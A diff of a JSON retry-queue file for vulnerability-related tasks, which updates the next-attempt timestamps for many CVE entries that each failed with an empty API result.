@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780512332.536062,
     "last_attempt": 1780530475.0303252,
-    "next_attempt": 1782342450.874116,
+    "next_attempt": 1782359069.44106,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780512332",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780530480.5636718,
     "last_attempt": 1780546499.8586967,
-    "next_attempt": 1782342436.6379972,
+    "next_attempt": 1782359059.7132282,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1780530480",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780530584.0778508,
     "last_attempt": 1780586677.0499845,
-    "next_attempt": 1782342426.1056623,
+    "next_attempt": 1782359107.9205647,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780530584",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780546440.7176404,
     "last_attempt": 1780586774.8416097,
-    "next_attempt": 1782342464.175407,
+    "next_attempt": 1782359093.648814,
     "metadata": {},
     "task_id": "task_CVE-2025-61884_1780546440",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780563111.619445,
     "last_attempt": 1780586768.8566246,
-    "next_attempt": 1782342430.5234308,
+    "next_attempt": 1782359069.1753438,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1780563111",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780586905.831617,
     "last_attempt": 1780606844.9520376,
-    "next_attempt": 1782342440.0572062,
+    "next_attempt": 1782359106.1087737,
     "metadata": {},
     "task_id": "task_CVE-2026-6815_1780586905",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780597241.834532,
     "last_attempt": 1780606880.2136576,
-    "next_attempt": 1782342453.9593287,
+    "next_attempt": 1782359114.6115572,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780597241",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780606850.0185814,
     "last_attempt": 1780636855.6671393,
-    "next_attempt": 1782342438.7206252,
+    "next_attempt": 1782359058.4709542,
     "metadata": {},
     "task_id": "task_CVE-2025-1242_1780606850",
     "required_result_fields": [
@@ -242,7 +242,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780618248.8727932,
     "last_attempt": 1780653337.212906,
-    "next_attempt": 1782342465.1977127,
+    "next_attempt": 1782359082.0726628,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780618248",
     "required_result_fields": [
@@ -271,7 +271,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780653297.2632146,
     "last_attempt": 1780653554.533717,
-    "next_attempt": 1782342417.6185062,
+    "next_attempt": 1782359088.974363,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1780653297",
     "required_result_fields": [
@@ -300,7 +300,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780675033.3490696,
     "last_attempt": 1780697850.5065532,
-    "next_attempt": 1782342475.6995013,
+    "next_attempt": 1782359115.430909,
     "metadata": {},
     "task_id": "task_CVE-2025-61884_1780675033",
     "required_result_fields": [
@@ -329,7 +329,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780675081.829122,
     "last_attempt": 1780697868.0568147,
-    "next_attempt": 1782342455.9369447,
+    "next_attempt": 1782359071.6537983,
     "metadata": {},
     "task_id": "task_CVE-2025-61882_1780675081",
     "required_result_fields": [
@@ -358,7 +358,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780689994.248999,
     "last_attempt": 1780721753.669892,
-    "next_attempt": 1782342473.2866077,
+    "next_attempt": 1782359061.6132839,
     "metadata": {},
     "task_id": "task_CVE-2025-49144_1780689994",
     "required_result_fields": [
@@ -387,7 +387,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780690078.0090535,
     "last_attempt": 1780721872.1519966,
-    "next_attempt": 1782342462.7572026,
+    "next_attempt": 1782359078.4449427,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780690078",
     "required_result_fields": [
@@ -416,7 +416,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780740446.248328,
     "last_attempt": 1780762114.1171057,
-    "next_attempt": 1782342474.6543682,
+    "next_attempt": 1782359102.8785725,
     "metadata": {},
     "task_id": "task_CVE-2025-49144_1780740446",
     "required_result_fields": [
@@ -445,7 +445,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780747630.8408463,
     "last_attempt": 1780776722.7824638,
-    "next_attempt": 1782342432.9334333,
+    "next_attempt": 1782359095.952731,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780747630",
     "required_result_fields": [
@@ -474,7 +474,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780757191.113863,
     "last_attempt": 1780776721.8697577,
-    "next_attempt": 1782342422.0172567,
+    "next_attempt": 1782359119.161745,
     "metadata": {},
     "task_id": "task_CVE-2025-55182_1780757191",
     "required_result_fields": [
@@ -503,7 +503,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780757210.5097108,
     "last_attempt": 1780776679.9484835,
-    "next_attempt": 1782342431.0772512,
+    "next_attempt": 1782359071.1572447,
     "metadata": {},
     "task_id": "task_CVE-2025-8088_1780757210",
     "required_result_fields": [
@@ -532,7 +532,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780757228.618619,
     "last_attempt": 1780776754.3610117,
-    "next_attempt": 1782342442.3725004,
+    "next_attempt": 1782359118.1251774,
     "metadata": {},
     "task_id": "task_CVE-2025-6554_1780757228",
     "required_result_fields": [
@@ -561,7 +561,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780762151.9247897,
     "last_attempt": 1780809968.9981909,
-    "next_attempt": 1782342463.1634026,
+    "next_attempt": 1782359092.473268,
     "metadata": {},
     "task_id": "task_CVE-2026-41089_1780762151",
     "required_result_fields": [
@@ -590,7 +590,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780769247.0176642,
     "last_attempt": 1780809867.0056555,
-    "next_attempt": 1782342442.4634318,
+    "next_attempt": 1782359085.0061684,
     "metadata": {},
     "task_id": "task_CVE-2026-1232_1780769247",
     "required_result_fields": [
@@ -619,7 +619,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780769269.6886911,
     "last_attempt": 1780776822.2383654,
-    "next_attempt": 1782342459.3291197,
+    "next_attempt": 1782359108.55386,
     "metadata": {},
     "task_id": "task_CVE-2026-42945_1780769269",
     "required_result_fields": [
@@ -648,7 +648,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780776733.668762,
     "last_attempt": 1780822789.0584369,
-    "next_attempt": 1782342412.793753,
+    "next_attempt": 1782359103.8182743,
     "metadata": {},
     "task_id": "task_CVE-2025-69985_1780776733",
     "required_result_fields": [
@@ -677,7 +677,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780776843.269161,
     "last_attempt": 1780822748.0588286,
-    "next_attempt": 1782342455.5997443,
+    "next_attempt": 1782359099.3331153,
     "metadata": {},
     "task_id": "task_CVE-2025-5419_1780776843",
     "required_result_fields": [
@@ -706,7 +706,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780790739.4256165,
     "last_attempt": 1780822776.9151795,
-    "next_attempt": 1782342461.3331628,
+    "next_attempt": 1782359067.3399515,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780790739",
     "required_result_fields": [
@@ -735,7 +735,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780809833.4754746,
     "last_attempt": 1780822941.3851836,
-    "next_attempt": 1782342428.3382041,
+    "next_attempt": 1782359092.18131,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1780809833",
     "required_result_fields": [
@@ -764,7 +764,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780822990.7154965,
     "last_attempt": 1780860454.1958985,
-    "next_attempt": 1782342416.6001356,
+    "next_attempt": 1782359075.2703352,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1780822990",
     "required_result_fields": [
@@ -793,7 +793,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780866987.2281024,
     "last_attempt": 1780910952.626501,
-    "next_attempt": 1782342471.6906834,
+    "next_attempt": 1782359056.7618039,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1780866987",
     "required_result_fields": [
@@ -822,7 +822,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780873742.129774,
     "last_attempt": 1780910931.8545413,
-    "next_attempt": 1782342433.8203878,
+    "next_attempt": 1782359067.4595723,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1780873742",
     "required_result_fields": [
@@ -851,7 +851,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780891820.331581,
     "last_attempt": 1780910781.4771016,
-    "next_attempt": 1782342437.5617564,
+    "next_attempt": 1782359076.7686498,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1780891820",
     "required_result_fields": [
@@ -880,7 +880,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780891959.4752328,
     "last_attempt": 1780910945.5984147,
-    "next_attempt": 1782342425.6650565,
+    "next_attempt": 1782359055.329348,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780891959",
     "required_result_fields": [
@@ -909,7 +909,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780911051.1339505,
     "last_attempt": 1780963782.1819546,
-    "next_attempt": 1782342446.654181,
+    "next_attempt": 1782359112.426121,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1780911051",
     "required_result_fields": [
@@ -938,7 +938,7 @@
     "last_error": "API返回空结果",
     "created_at": 1780941357.4427395,
     "last_attempt": 1780950218.1774075,
-    "next_attempt": 1782342462.485934,
+    "next_attempt": 1782359055.771022,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1780941357",
     "required_result_fields": [
@@ -967,7 +967,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781020714.657517,
     "last_attempt": 1781045140.134188,
-    "next_attempt": 1782342421.5325918,
+    "next_attempt": 1782359061.0685177,
     "metadata": {},
     "task_id": "task_CVE-2026-41089_1781020714",
     "required_result_fields": [
@@ -996,7 +996,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781038906.5535312,
     "last_attempt": 1781045204.0521402,
-    "next_attempt": 1782342469.0218182,
+    "next_attempt": 1782359112.952058,
     "metadata": {},
     "task_id": "task_CVE-2025-49144_1781038906",
     "required_result_fields": [
@@ -1025,7 +1025,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781045125.900021,
     "last_attempt": 1781114412.0992215,
-    "next_attempt": 1782342446.3232577,
+    "next_attempt": 1782359117.738817,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1781045125",
     "required_result_fields": [
@@ -1054,7 +1054,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781068846.522315,
     "last_attempt": 1781114401.2535086,
-    "next_attempt": 1782342434.672754,
+    "next_attempt": 1782359057.4918783,
     "metadata": {},
     "task_id": "task_CVE-2026-2472_1781068846",
     "required_result_fields": [
@@ -1083,7 +1083,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781069135.7306018,
     "last_attempt": 1781137139.0883262,
-    "next_attempt": 1782342441.8997865,
+    "next_attempt": 1782359067.1956449,
     "metadata": {},
     "task_id": "task_CVE-2025-5419_1781069135",
     "required_result_fields": [
@@ -1112,7 +1112,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781114489.7296999,
     "last_attempt": 1781173869.681264,
-    "next_attempt": 1782342448.9710157,
+    "next_attempt": 1782359091.5145054,
     "metadata": {},
     "task_id": "task_CVE-2026-25643_1781114489",
     "required_result_fields": [
@@ -1141,7 +1141,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781131990.29619,
     "last_attempt": 1781173824.0021768,
-    "next_attempt": 1782342437.1208954,
+    "next_attempt": 1782359069.1309032,
     "metadata": {},
     "task_id": "task_CVE-2025-61884_1781131990",
     "required_result_fields": [
@@ -1170,7 +1170,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781173909.18911,
     "last_attempt": 1781220367.4877925,
-    "next_attempt": 1782342467.9964757,
+    "next_attempt": 1782359102.926261,
     "metadata": {},
     "task_id": "task_CVE-2026-6815_1781173909",
     "required_result_fields": [
@@ -1199,7 +1199,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781188799.24396,
     "last_attempt": 1781213037.9843972,
-    "next_attempt": 1782342474.5981596,
+    "next_attempt": 1782359074.5324757,
     "metadata": {},
     "task_id": "task_CVE-2026-23111_1781188799",
     "required_result_fields": [
@@ -1228,7 +1228,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781213065.6432798,
     "last_attempt": 1781237513.7013652,
-    "next_attempt": 1782342440.4868882,
+    "next_attempt": 1782359086.1521797,
     "metadata": {},
     "task_id": "task_CVE-2026-43284_1781213065",
     "required_result_fields": [
@@ -1257,7 +1257,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781237415.1112807,
     "last_attempt": 1781255364.64916,
-    "next_attempt": 1782342413.8496315,
+    "next_attempt": 1782359058.887159,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1781237415",
     "required_result_fields": [
@@ -1286,7 +1286,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781254932.9696982,
     "last_attempt": 1781267345.4432652,
-    "next_attempt": 1782342421.8433242,
+    "next_attempt": 1782359077.2123091,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1781254932",
     "required_result_fields": [
@@ -1315,7 +1315,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781255342.7972565,
     "last_attempt": 1781281449.1993144,
-    "next_attempt": 1782342414.335686,
+    "next_attempt": 1782359118.3532498,
     "metadata": {},
     "task_id": "task_CVE-2025-54253_1781255342",
     "required_result_fields": [
@@ -1344,7 +1344,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781255360.9210665,
     "last_attempt": 1781281296.693164,
-    "next_attempt": 1782342473.1090887,
+    "next_attempt": 1782359088.0212421,
     "metadata": {},
     "task_id": "task_CVE-2025-54424_1781255360",
     "required_result_fields": [
@@ -1373,7 +1373,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781267427.8222303,
     "last_attempt": 1781323111.6153502,
-    "next_attempt": 1782342469.5422366,
+    "next_attempt": 1782359076.3198335,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1781267427",
     "required_result_fields": [
@@ -1402,7 +1402,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781281675.6797843,
     "last_attempt": 1781323126.503806,
-    "next_attempt": 1782342417.7055395,
+    "next_attempt": 1782359087.2564888,
     "metadata": {},
     "task_id": "task_CVE-2026-35273_1781281675",
     "required_result_fields": [
@@ -1431,7 +1431,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781323011.1808517,
     "last_attempt": 1781346821.0870156,
-    "next_attempt": 1782342467.2897847,
+    "next_attempt": 1782359107.036782,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1781323011",
     "required_result_fields": [
@@ -1460,7 +1460,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781323030.2120469,
     "last_attempt": 1781346811.6879303,
-    "next_attempt": 1782342472.2740474,
+    "next_attempt": 1782359074.3770533,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1781323030",
     "required_result_fields": [
@@ -1489,7 +1489,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781363137.863459,
     "last_attempt": 1781426647.4596708,
-    "next_attempt": 1782342472.0769033,
+    "next_attempt": 1782359088.6731656,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1781363137",
     "required_result_fields": [
@@ -1518,7 +1518,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781371607.2510772,
     "last_attempt": 1781426622.88031,
-    "next_attempt": 1782342467.3950856,
+    "next_attempt": 1782359068.208906,
     "metadata": {},
     "task_id": "task_CVE-2025-32711_1781371607",
     "required_result_fields": [
@@ -1547,7 +1547,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781371665.3612547,
     "last_attempt": 1781426635.7786112,
-    "next_attempt": 1782342438.0013254,
+    "next_attempt": 1782359078.0338886,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1781371665",
     "required_result_fields": [
@@ -1576,7 +1576,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781371756.5390553,
     "last_attempt": 1781454329.7396922,
-    "next_attempt": 1782342445.9579675,
+    "next_attempt": 1782359061.7872968,
     "metadata": {},
     "task_id": "task_CVE-2026-49975_1781371756",
     "required_result_fields": [
@@ -1605,7 +1605,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781378964.7667253,
     "last_attempt": 1781426654.961662,
-    "next_attempt": 1782342451.8653438,
+    "next_attempt": 1782359066.4094925,
     "metadata": {},
     "task_id": "task_CVE-2026-20230_1781378964",
     "required_result_fields": [
@@ -1634,7 +1634,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781392032.427467,
     "last_attempt": 1781446077.8433163,
-    "next_attempt": 1782342427.3830712,
+    "next_attempt": 1782359079.3135755,
     "metadata": {},
     "task_id": "task_CVE-2025-61882_1781392032",
     "required_result_fields": [
@@ -1663,7 +1663,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781426509.2315626,
     "last_attempt": 1781454281.525377,
-    "next_attempt": 1782342440.316628,
+    "next_attempt": 1782359087.950879,
     "metadata": {},
     "task_id": "task_CVE-2025-8088_1781426509",
     "required_result_fields": [
@@ -1692,7 +1692,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781426542.985012,
     "last_attempt": 1781468471.5279891,
-    "next_attempt": 1782342420.1283114,
+    "next_attempt": 1782359118.8324628,
     "metadata": {},
     "task_id": "task_CVE-2025-6554_1781426542",
     "required_result_fields": [
@@ -1721,7 +1721,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781454267.9459977,
     "last_attempt": 1781468551.0471094,
-    "next_attempt": 1782342474.3433666,
+    "next_attempt": 1782359112.0765054,
     "metadata": {},
     "task_id": "task_CVE-2025-69985_1781454267",
     "required_result_fields": [
@@ -1750,7 +1750,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781468486.5245845,
     "last_attempt": 1781504812.8186424,
-    "next_attempt": 1782342431.9787955,
+    "next_attempt": 1782359116.2105203,
     "metadata": {},
     "task_id": "task_CVE-2025-5419_1781468486",
     "required_result_fields": [
@@ -1779,7 +1779,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781548086.140615,
     "last_attempt": 1781548318.6156003,
-    "next_attempt": 1782342423.449226,
+    "next_attempt": 1782359080.3049934,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1781548086",
     "required_result_fields": [
@@ -1808,7 +1808,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781559929.829219,
     "last_attempt": 1781583929.5556705,
-    "next_attempt": 1782342438.0929508,
+    "next_attempt": 1782359116.465779,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1781559929",
     "required_result_fields": [
@@ -1837,7 +1837,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781604614.0160782,
     "last_attempt": 1781774228.5997252,
-    "next_attempt": 1782342453.2020988,
+    "next_attempt": 1782359056.661468,
     "metadata": {},
     "task_id": "task_CVE-2026-4480_1781604614",
     "required_result_fields": [
@@ -1866,7 +1866,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781604816.3982408,
     "last_attempt": 1781774277.3157766,
-    "next_attempt": 1782342457.6078415,
+    "next_attempt": 1782359076.704425,
     "metadata": {},
     "task_id": "task_CVE-2025-54424_1781604816",
     "required_result_fields": [
@@ -1895,7 +1895,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781755798.833734,
     "last_attempt": 1781820850.681725,
-    "next_attempt": 1782342429.5713515,
+    "next_attempt": 1782359105.857227,
     "metadata": {},
     "task_id": "task_CVE-2026-44963_1781755798",
     "required_result_fields": [
@@ -1924,7 +1924,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781774183.752033,
     "last_attempt": 1781820889.55043,
-    "next_attempt": 1782342431.4638717,
+    "next_attempt": 1782359080.683586,
     "metadata": {},
     "task_id": "task_CVE-2026-1492_1781774183",
     "required_result_fields": [
@@ -1953,7 +1953,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781800550.9965112,
     "last_attempt": 1782038022.2381878,
-    "next_attempt": 1782342472.3105135,
+    "next_attempt": 1782359074.527989,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1781800550",
     "required_result_fields": [
@@ -1982,7 +1982,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781800643.5964067,
     "last_attempt": 1782038033.6944227,
-    "next_attempt": 1782342433.0236833,
+    "next_attempt": 1782359097.4588952,
     "metadata": {},
     "task_id": "task_CVE-2026-46215_1781800643",
     "required_result_fields": [
@@ -2011,7 +2011,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781811095.064364,
     "last_attempt": 1782038132.8346038,
-    "next_attempt": 1782342419.0411818,
+    "next_attempt": 1782359089.6691315,
     "metadata": {},
     "task_id": "task_CVE-2026-46368_1781811095",
     "required_result_fields": [
@@ -2040,7 +2040,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781820874.1270294,
     "last_attempt": 1782038242.1570342,
-    "next_attempt": 1782342442.8310094,
+    "next_attempt": 1782359098.2031727,
     "metadata": {},
     "task_id": "task_CVE-2026-50751_1781820874",
     "required_result_fields": [
@@ -2069,7 +2069,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781820931.2598102,
     "last_attempt": 1782038256.2962947,
-    "next_attempt": 1782342471.95484,
+    "next_attempt": 1782359078.3822708,
     "metadata": {},
     "task_id": "task_CVE-2026-50752_1781820931",
     "required_result_fields": [
@@ -2098,7 +2098,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781850222.6655288,
     "last_attempt": 1782038467.0817056,
-    "next_attempt": 1782342429.3680313,
+    "next_attempt": 1782359061.2810462,
     "metadata": {},
     "task_id": "task_CVE-2025-2304_1781850222",
     "required_result_fields": [
@@ -2127,7 +2127,7 @@
     "last_error": "API返回空结果",
     "created_at": 1781899296.205073,
     "last_attempt": 1782057334.2902935,
-    "next_attempt": 1782342428.184391,
+    "next_attempt": 1782359113.1808524,
     "metadata": {},
     "task_id": "task_CVE-2026-42530_1781899296",
     "required_result_fields": [
@@ -2156,7 +2156,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782021872.6276588,
     "last_attempt": 1782063801.2134957,
-    "next_attempt": 1782342453.3730137,
+    "next_attempt": 1782359109.1947198,
     "metadata": {},
     "task_id": "task_CVE-2026-0073_1782021872",
     "required_result_fields": [
@@ -2185,7 +2185,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782037999.939959,
     "last_attempt": 1782071177.1760466,
-    "next_attempt": 1782342454.6771626,
+    "next_attempt": 1782359057.0978882,
     "metadata": {},
     "task_id": "task_CVE-2026-11561_1782037999",
     "required_result_fields": [
@@ -2214,7 +2214,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782038349.345088,
     "last_attempt": 1782076673.2144208,
-    "next_attempt": 1782342427.333911,
+    "next_attempt": 1782359079.327011,
     "metadata": {},
     "task_id": "task_CVE-2025-43529_1782038349",
     "required_result_fields": [
@@ -2243,7 +2243,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782057255.668832,
     "last_attempt": 1782076738.0186746,
-    "next_attempt": 1782342430.6275983,
+    "next_attempt": 1782359093.3646858,
     "metadata": {},
     "task_id": "task_CVE-2025-13407_1782057255",
     "required_result_fields": [
@@ -2272,7 +2272,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782057407.6924758,
     "last_attempt": 1782083869.362129,
-    "next_attempt": 1782342458.3122284,
+    "next_attempt": 1782359108.9701912,
     "metadata": {},
     "task_id": "task_CVE-2026-2472_1782057407",
     "required_result_fields": [
@@ -2301,7 +2301,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782063850.8617635,
     "last_attempt": 1782102370.8223083,
-    "next_attempt": 1782342414.4477587,
+    "next_attempt": 1782359103.9701574,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1782063850",
     "required_result_fields": [
@@ -2330,7 +2330,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782071127.4109805,
     "last_attempt": 1782102368.159815,
-    "next_attempt": 1782342473.7607574,
+    "next_attempt": 1782359056.2559226,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1782071127",
     "required_result_fields": [
@@ -2359,7 +2359,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782076675.1099834,
     "last_attempt": 1782102464.8573713,
-    "next_attempt": 1782342451.3495648,
+    "next_attempt": 1782359106.7262785,
     "metadata": {},
     "task_id": "task_CVE-2026-48909_1782076675",
     "required_result_fields": [
@@ -2388,7 +2388,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782076749.075529,
     "last_attempt": 1782102504.0548227,
-    "next_attempt": 1782342461.3976161,
+    "next_attempt": 1782359111.3195748,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1782076749",
     "required_result_fields": [
@@ -2417,7 +2417,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782076852.3601604,
     "last_attempt": 1782102650.8363822,
-    "next_attempt": 1782342448.6176786,
+    "next_attempt": 1782359093.8424585,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1782076852",
     "required_result_fields": [
@@ -2446,7 +2446,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782124958.1598465,
     "last_attempt": 1782143999.3762984,
-    "next_attempt": 1782342445.0964408,
+    "next_attempt": 1782359115.956263,
     "metadata": {},
     "task_id": "task_CVE-2026-46300_1782124958",
     "required_result_fields": [
@@ -2475,7 +2475,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782143670.5960374,
     "last_attempt": 1782156756.7258408,
-    "next_attempt": 1782342431.5369017,
+    "next_attempt": 1782359114.504035,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1782143670",
     "required_result_fields": [
@@ -2504,7 +2504,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782165872.6720657,
     "last_attempt": 1782173616.5305903,
-    "next_attempt": 1782342463.2131064,
+    "next_attempt": 1782359108.7274656,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1782165872",
     "required_result_fields": [
@@ -2533,7 +2533,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782192468.7241068,
     "last_attempt": 1782208159.4743972,
-    "next_attempt": 1782342474.9874218,
+    "next_attempt": 1782359071.2783887,
     "metadata": {},
     "task_id": "task_CVE-2025-69985_1782192468",
     "required_result_fields": [
@@ -2562,7 +2562,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782207990.1555994,
     "last_attempt": 1782218409.6347182,
-    "next_attempt": 1782342434.3681424,
+    "next_attempt": 1782359113.2113285,
     "metadata": {},
     "task_id": "task_CVE-2026-42221_1782207990",
     "required_result_fields": [
@@ -2591,7 +2591,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782218086.1122496,
     "last_attempt": 1782229905.9987326,
-    "next_attempt": 1782342461.1904407,
+    "next_attempt": 1782359081.4157605,
     "metadata": {},
     "task_id": "task_CVE-2026-2472_1782218086",
     "required_result_fields": [
@@ -2620,7 +2620,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782218126.4577365,
     "last_attempt": 1782237676.4091063,
-    "next_attempt": 1782342462.6021936,
+    "next_attempt": 1782359100.397557,
     "metadata": {},
     "task_id": "task_CVE-2025-69985_1782218126",
     "required_result_fields": [
@@ -2649,7 +2649,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782237644.8437102,
     "last_attempt": 1782246085.5878344,
-    "next_attempt": 1782342436.3355887,
+    "next_attempt": 1782359104.034851,
     "metadata": {},
     "task_id": "task_CVE-2026-2441_1782237644",
     "required_result_fields": [
@@ -2678,7 +2678,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782237689.5556529,
     "last_attempt": 1782253017.6305346,
-    "next_attempt": 1782342420.3571987,
+    "next_attempt": 1782359095.9073057,
     "metadata": {},
     "task_id": "task_CVE-2026-20841_1782237689",
     "required_result_fields": [
@@ -2707,7 +2707,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782245864.8056986,
     "last_attempt": 1782253188.6681526,
-    "next_attempt": 1782342465.6454256,
+    "next_attempt": 1782359095.136544,
     "metadata": {},
     "task_id": "task_CVE-2026-39338_1782245864",
     "required_result_fields": [
@@ -2736,7 +2736,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782245910.0139422,
     "last_attempt": 1782253178.9746253,
-    "next_attempt": 1782342444.3781834,
+    "next_attempt": 1782359064.9745677,
     "metadata": {},
     "task_id": "task_CVE-2025-69985_1782245910",
     "required_result_fields": [
@@ -2765,7 +2765,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782275001.0135496,
     "last_attempt": 1782301671.8162363,
-    "next_attempt": 1782342427.5740905,
+    "next_attempt": 1782359096.8075078,
     "metadata": {},
     "task_id": "task_CVE-2025-69985_1782275001",
     "required_result_fields": [
@@ -2794,7 +2794,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782301711.2949147,
     "last_attempt": 1782336407.77778,
-    "next_attempt": 1782342430.2676146,
+    "next_attempt": 1782359073.3177223,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1782301711",
     "required_result_fields": [
@@ -2823,7 +2823,7 @@
     "last_error": "API返回空结果",
     "created_at": 1782320979.2119784,
     "last_attempt": 1782336390.2578273,
-    "next_attempt": 1782342462.7869823,
+    "next_attempt": 1782359115.9300942,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1782320979",
     "required_result_fields": [
@@ -2844,15 +2844,15 @@
   {
     "cve_id": "CVE-2026-24061",
